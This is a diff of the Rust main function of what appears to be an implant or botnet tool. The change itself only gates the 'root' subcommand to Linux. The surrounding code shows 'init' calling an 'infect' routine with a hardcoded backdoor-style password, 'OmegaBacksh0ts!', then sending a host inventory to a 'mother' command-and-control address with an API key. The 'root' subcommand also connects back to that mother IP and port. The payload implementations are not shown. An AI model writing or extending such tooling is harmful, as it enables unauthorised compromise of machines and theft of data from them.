@@ -74,12 +74,20 @@ async fn main() {
             }
         }
         Some(("root", sub_matches)) => {
-            let lifetime = sub_matches.get_one::<u8>("lifetime").unwrap();
-            let mother_ip = sub_matches.get_one::<std::net::IpAddr>("mother").unwrap();
-            let port = sub_matches.get_one::<u16>("port").unwrap();
+            #[cfg(target_os = "linux")]
+            {
+                let lifetime = sub_matches.get_one::<u8>("lifetime").unwrap();
+                let mother_ip = sub_matches.get_one::<std::net::IpAddr>("mother").unwrap();
+                let port = sub_matches.get_one::<u16>("port").unwrap();
+    
+                let host = Host::new();
+                let _ = host.root(&mother_ip.to_string(), *port, *lifetime);
+            }
 
-            let host = Host::new();
-            let _ = host.root(&mother_ip.to_string(), *port, *lifetime);
+            #[cfg(target_os = "windows")]
+            {
+                print!("This function is not supported on Windows")
+            } 
         }
         Some(("ip", _)) => println!("{}", Host::ip()),
         Some(("init", sub_matches)) => {
@@ -89,6 +97,8 @@ async fn main() {
             let host = Host::new();
             host.infect(69, "OmegaBacksh0ts!");
             host.inventory(&mother_ip.to_string(), &api_key).await;
+            
+
         }
         _ => {}
     }
